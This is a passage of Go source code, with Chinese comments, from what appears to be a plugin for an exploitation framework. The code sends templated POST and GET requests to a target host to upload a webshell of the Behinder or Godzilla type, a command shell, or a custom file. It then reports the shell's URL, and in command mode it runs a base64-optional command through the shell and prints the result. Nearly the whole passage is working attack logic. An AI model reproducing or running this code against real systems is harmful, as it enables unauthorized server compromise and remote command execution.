			//拼接结构体数组(定义的请求包在此处添加)
			ResultAllData = append(ResultAllData, Result1)

			//组装文件名
			filename := makeFileNameFasffBsswAA(filetype)
			//存放正则表达式结果(每次请求置空)
			ResultRegular := ``
			//存放正则表达式结果(永久保留，直到下一次定义)
			ResultRegularALL := ``

			//构造请求
			for _, ResultAllNum := range ResultAllData {
				ResultAllNum.ResultOfData = strings.Replace(ResultAllNum.ResultOfData, "{{{filename}}}", filename, -1)
				ResultAllNum.ResultOfUrl = strings.Replace(ResultAllNum.ResultOfUrl, "{{{filename}}}", filename, -1)
				if ResultRegular != "" {
					ResultAllNum.ResultOfData = strings.Replace(ResultAllNum.ResultOfData, "{{{Regular}}}", ResultRegular, -1)
					ResultAllNum.ResultOfUrl = strings.Replace(ResultAllNum.ResultOfUrl, "{{{Regular}}}", ResultRegular, -1)
					ResultRegular = ""
				}
				if ResultRegularALL != "" {
					ResultAllNum.ResultOfData = strings.Replace(ResultAllNum.ResultOfData, "{{{RegularALL}}}", ResultRegularALL, -1)
					ResultAllNum.ResultOfUrl = strings.Replace(ResultAllNum.ResultOfUrl, "{{{RegularALL}}}", ResultRegularALL, -1)
					for key, value := range ResultAllNum.ResultOfMap {
						if strings.Contains(value, "{{{RegularALL}}}") {
							ResultAllNum.ResultOfMap[key] = strings.ReplaceAll(value, "{{{RegularALL}}}", ResultRegularALL)
						}
					}
				}
				switch mode {
				case "Behinder":
					ResultAllNum.ResultOfData = strings.Replace(ResultAllNum.ResultOfData, "{{{content}}}", contentBehinder, -1)
					ResultAllNum.ResultOfUrl = strings.Replace(ResultAllNum.ResultOfUrl, "{{{content}}}", contentBehinder, -1)
				case "Godzilla":
					ResultAllNum.ResultOfData = strings.Replace(ResultAllNum.ResultOfData, "{{{content}}}", contentGodzilla, -1)
					ResultAllNum.ResultOfUrl = strings.Replace(ResultAllNum.ResultOfUrl, "{{{content}}}", contentGodzilla, -1)
				case "Command":
					ResultAllNum.ResultOfData = strings.Replace(ResultAllNum.ResultOfData, "{{{content}}}", contentCommand, -1)
					ResultAllNum.ResultOfUrl = strings.Replace(ResultAllNum.ResultOfUrl, "{{{content}}}", contentCommand, -1)
				default:
					ResultAllNum.ResultOfData = strings.Replace(ResultAllNum.ResultOfData, "{{{content}}}", customize, -1)
					ResultAllNum.ResultOfUrl = strings.Replace(ResultAllNum.ResultOfUrl, "{{{content}}}", customize, -1)
				}

				switch ResultAllNum.ResultOfType {
				case "POST":
					Result, err := sendPayloadFlagPostFasffBsswAA(expResult.HostInfo, ResultAllNum.ResultOfUrl, ResultAllNum.ResultOfData, ResultAllNum.ResultOfMap)
					if err != nil || Result.StatusCode != 200 {
						expResult.Success = false
						expResult.Output = "漏洞利用失败"
						return expResult
					}
					if ResultAllNum.ResultOfRegular != "" {
						ResultRegular, _ = makeRegularFasffBsswAA(Result.Utf8Html+Result.HeaderString.String(), ResultAllNum.ResultOfRegular)
					}
					if ResultAllNum.ResultOfRegularALL != "" {
						ResultRegularALL, _ = makeRegularFasffBsswAA(Result.Utf8Html+Result.HeaderString.String(), ResultAllNum.ResultOfRegularALL)
					}
				case "GET":
					Result, err := sendPayloadFlagGetFasffBsswAA(expResult.HostInfo, ResultAllNum.ResultOfUrl, ResultAllNum.ResultOfMap)
					if err != nil || Result.StatusCode != 200 {
						expResult.Success = false
						expResult.Output = "漏洞利用失败"
						return expResult
					}
				}
			}

			//设置输出
			ResultAllURL = strings.Replace(ResultAllURL, "{{{Regular}}}", ResultRegular, -1)
			ResultAllURL = strings.Replace(ResultAllURL, "{{{RegularALL}}}", ResultRegularALL, -1)
			if isBase64 {
				//base64编码
				command = base64.StdEncoding.EncodeToString([]byte(command))
			}
			if ResultAllURL == "" {
				return expResult
			}
			switch mode {
			case "Behinder":
				expResult.Success = true
				expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + ResultAllURL + "\n"
				expResult.Output += BehinderText
				return expResult
			case "Godzilla":
				expResult.Success = true
				expResult.Output += "哥斯拉WebShell URL: " + expResult.HostInfo.FixedHostInfo + ResultAllURL + "\n"
				expResult.Output += GodzillaText
				return expResult
			case "Command":
				expResult.Success = true
				getResult, _ := sendPayloadFlagGetFasffBsswAA(expResult.HostInfo, expResult.HostInfo.FixedHostInfo+ResultAllURL+`?=`+command, nil)
				expResult.Output += "命令执行结果：\n" + getResult.Utf8Html
				return expResult
			default:
				expResult.Success = true
				expResult.Output += "自定义上传成功: URL: " + expResult.HostInfo.FixedHostInfo + ResultAllURL + "\n"
				return expResult
			}
		},
	))
}
